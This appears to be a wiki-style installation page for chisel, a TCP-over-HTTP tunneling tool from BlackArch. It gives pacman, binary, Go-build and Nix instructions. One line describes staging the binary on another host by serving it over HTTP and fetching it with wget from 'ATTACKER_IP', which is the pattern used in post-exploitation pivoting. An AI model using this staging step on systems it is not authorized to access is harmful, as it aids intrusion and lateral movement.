---
tool: "chisel"
build-system: "go"
upstream: "https://github.com/jpillora/chisel"
recipe: "blackarch"
nix-package: "chisel"
aur-package: "chisel"
source: "https://github.com/jpillora/chisel"
license: "MIT"
blackarch-pkgver: "263.5ee6c74"
---

# Installing chisel

> A fast TCP tunnel over HTTP.

Recipe source of truth: BlackArch [`PKGBUILD`](https://github.com/BlackArch/blackarch/tree/master/packages/chisel) (version `263.5ee6c74`, license MIT).

## Arch / BlackArch

```bash
sudo pacman -S chisel    # needs the [blackarch] repo enabled
```

## Any Linux distro

**A. Prebuilt release binary (easiest — static, no dependencies):**

```bash
curl -L https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -o chisel.gz
gunzip chisel.gz && chmod +x chisel   # single static executable, client+server in one
```

Deploying to another host: serve the binary from your machine (`python3 -m http.server 8000`) and fetch it there (`wget ATTACKER_IP:8000/chisel`), then `chmod +x`. Keep server and client versions close — mismatched major versions can fail the handshake. See [upstream releases](https://github.com/jpillora/chisel/releases) for current versions and other platforms.

**B. Build from source (needs `go`):**

**Source:** download the release from the [upstream site](https://github.com/jpillora/chisel) (the recipe uses a versioned archive).

```bash
go build ./...   # exact recipe flags below
```

## Dependencies (from recipe)

- **Build tools**: `git`, `go`

## Exact build steps from the recipe

```bash
cd $pkgname

  GOPATH="$srcdir" go mod download
  GOPATH="$srcdir" go build \
    -trimpath \
    -buildmode=pie \
    -mod=readonly \
    -modcacherw \
    -ldflags "-s -w -X github.com/jpillora/chisel/share.BuildVersion=$(git describe --abbrev=0 --tags)" \
    -o $pkgname .
```

## Installed layout (per recipe)

- No `/usr/bin` entry — scripts run from the source/`/usr/share` directory

Backlinks: [[tunnel]] · [[chisel]] · [[BlackArch Tools]]


## Nix (works on any distro)

```bash
nix run nixpkgs#chisel    # ad-hoc run, no install
nix profile install nixpkgs#chisel   # or persist it
```
